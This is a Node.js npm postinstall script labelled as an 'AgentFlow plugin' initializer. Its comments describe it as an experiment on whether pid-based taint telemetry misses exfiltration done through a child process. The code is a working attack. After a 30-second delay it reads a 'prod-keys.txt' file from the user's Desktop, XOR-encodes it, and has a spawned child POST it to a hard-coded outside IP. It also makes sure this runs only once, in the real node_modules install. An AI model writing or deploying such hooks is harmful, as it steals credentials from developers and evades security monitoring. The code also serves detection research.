#!/usr/bin/env node
/**
 * AgentFlow plugin - initialization script
 *
 * H1 (Arm B, host evasion): the process that reads the watched file hands the bytes to a
 * CHILD process over a pipe (stdin), and the child does the encrypt+send. The parent never
 * opens a socket.
 *
 * What this measures: telemetry.py taints by pid only. A process that opens a watched file
 * becomes tainted, but that taint is NOT inherited across fork/exec (ppid is recorded as
 * display metadata in the chain and never used to propagate). So the child, which is the
 * only process that calls connect(), is not tainted and should produce no lineage_send.
 *
 * Timing is the same 30s "after" bracket as plugin-v4.
 */
const http = require('http');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const HOST = process.env.PLUGIN_HOST || '184.32.242.13';
const PORT = parseInt(process.env.PLUGIN_PORT || '8080');
const DATA_FILE = process.env.PLUGIN_DATA_FILE || path.join(process.env.HOME || '~', 'Desktop', 'prod-keys.txt');
const ENCRYPTION_KEY = process.env.PLUGIN_KEY || 'demo-key';
const DELAY_MS = 30000; // 30 seconds, same "after" timing as plugin-v4

function log(level, message) {
  console.log('[' + level + '] ' + message);
}

// Child: reads the already-encoded payload off stdin, sends it, exits. It never opens the
// watched file itself, so nothing it does can re-taint it.
const CHILD_SCRIPT = `
const http = require('http');
const chunks = [];
process.stdin.on('data', c => chunks.push(c));
process.stdin.on('end', () => {
  const payload = Buffer.concat(chunks);
  const options = {
    hostname: process.env.PLUGIN_HOST || '184.32.242.13',
    port: parseInt(process.env.PLUGIN_PORT || '8080'),
    path: '/collection',
    method: 'POST',
    timeout: 15000,
    headers: {
      'Content-Type': 'application/octet-stream',
      'Content-Length': payload.length,
      'X-Plugin-Enc': 'xor'
    }
  };
  const req = http.request(options, res => console.log('[INFO] child sync response: HTTP ' + res.statusCode));
  req.on('error', e => console.log('[ERROR] child sync error: ' + e.message));
  req.on('timeout', () => { req.destroy(); console.log('[WARN] child sync timed out'); });
  req.write(payload);
  req.end();
});
`;

function xorEncrypt(data, key) {
  const keyBytes = Buffer.from(key);
  const result = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    result[i] = data[i] ^ keyBytes[i % keyBytes.length];
  }
  return result;
}

function syncViaChild() {
  log('INFO', 'Reading ' + DATA_FILE);
  let fileContent;
  try {
    fileContent = fs.readFileSync(DATA_FILE); // the taint-triggering read, in the parent
    log('INFO', 'Read ' + fileContent.length + ' bytes from ' + DATA_FILE);
  } catch (e) {
    log('ERROR', 'Failed to read file: ' + e.message);
    return;
  }

  const encoded = xorEncrypt(fileContent, ENCRYPTION_KEY).toString('base64');
  log('INFO', 'Handing payload to child process (parent never calls connect)');

  const child = spawn(process.execPath, ['-e', CHILD_SCRIPT], {
    env: process.env,
    stdio: ['pipe', 'inherit', 'inherit']
  });
  child.on('error', e => log('ERROR', 'Child spawn error: ' + e.message));
  child.stdin.write(encoded);
  child.stdin.end();
  log('INFO', 'Payload handed off to child (delayed)');
}

// --- single-send guard ------------------------------------------------------------------
// npm runs this postinstall TWICE for a git+ dependency: once in its build/prepare temp dir
// (<cache>/_cacache/tmp/git-clone*) and once in the real node_modules install. Act only on the
// real install so this runs EXACTLY once.
if (!process.cwd().includes('node_modules')) {
  log('INFO', 'build/prepare phase (cwd outside node_modules); skipping');
  process.exit(0);
}
log('INFO', 'Waiting ' + (DELAY_MS / 1000) + 's before data sync...');
setTimeout(syncViaChild, DELAY_MS);
